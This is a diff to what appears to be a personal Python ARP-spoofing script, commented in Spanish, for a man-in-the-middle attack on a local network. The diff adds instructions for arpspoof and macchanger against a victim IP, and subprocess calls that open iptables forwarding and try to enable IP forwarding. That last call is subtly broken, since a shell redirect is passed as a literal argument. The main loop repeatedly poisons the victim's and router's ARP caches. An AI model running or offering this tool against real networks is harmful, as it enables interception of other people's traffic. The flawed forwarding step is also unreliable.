@@ -10,10 +10,16 @@ man in the middle attack with poisoned arp
 # Verificar que el
 /proc/sys/net/ipv4/ip_forward contenga
 1
+
+INFO: una herramienta es arpspoof (sudo pacman -S dsniff)
+c ambiamos de mac y ejecutamos
+> macchanger -m <nueva_mac_address> <interface_de_red>
+> arpspoof -i ens33 -t <ip_victioma> -r <ip_router>
 """
 
 import argparse
 import signal
+import subprocess
 import sys
 
 import scapy.all as scapy
@@ -56,13 +62,25 @@ def spoof(ip_address, spoof_ip):
 
 
 def main():
+
+    # HACK: command to enable forwarding
+    forwardin_command = ["iptables", "--policy", "FORWARD", "ACCEPT"]
+    subprocess.run(forwardin_command)
+
+    # HACK: dont lose comunication with victim and router
+    change_proc_settings = ["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"]
+    subprocess.run(change_proc_settings)
+
+    subprocess.run(["cat", "/proc/sys/net/ipv4/ip_forward"])
+
     arguments = get_arguments()
     print(
         colored(
             f"[+] El host a interceptar es {arguments.ip_address}",
-            "red",
+            "green",
         )
     )
+    print(colored("Comunicacion interceptada...\n\n"))
     router_ip = "192.168.100.1"
     while True:
         spoof(arguments.ip_address, router_ip)
